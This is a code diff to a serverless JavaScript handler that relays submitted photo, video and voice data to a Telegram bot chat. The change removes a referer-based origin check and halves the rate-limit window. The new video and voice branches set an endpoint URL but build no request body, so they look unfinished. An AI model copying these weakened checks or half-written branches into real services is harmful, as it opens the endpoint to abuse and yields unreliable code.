@@ -15,16 +15,11 @@ export default async function handler(req, res) {
         return res.status(405).json({ error: 'Method not allowed' });
     }
 
-    const referer = req.headers.referer || '';
-    if (!referer.includes('vercel.app')) {
-        return res.status(403).json({ error: 'Forbidden request' });
-    }
-
     const clientIp = req.headers['x-forwarded-for'] || 'unknown';
     const currentTime = Date.now();
     
     if (requestLimits.has(clientIp)) {
-        if (currentTime - requestLimits.get(clientIp) < 2000) {
+        if (currentTime - requestLimits.get(clientIp) < 1000) {
             return res.status(429).json({ error: 'Too many requests.' });
         }
     }
@@ -48,6 +43,13 @@ export default async function handler(req, res) {
 
         if (type === 'photo' && data) {
             telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            bodyData = { chat_id: CHAT_ID, caption: caption ? caption.slice(0, 1000) : "", photo: data, parse_mode: "Markdown" };
+        } else if (type === 'video' && data) {
+            telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
+            // بۆ ڤیدیۆ
+        } else if (type === 'voice' && data) {
+            telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`;
+            // بۆ دەنگ
         }
 
         const response = await fetch(telegramUrl, {
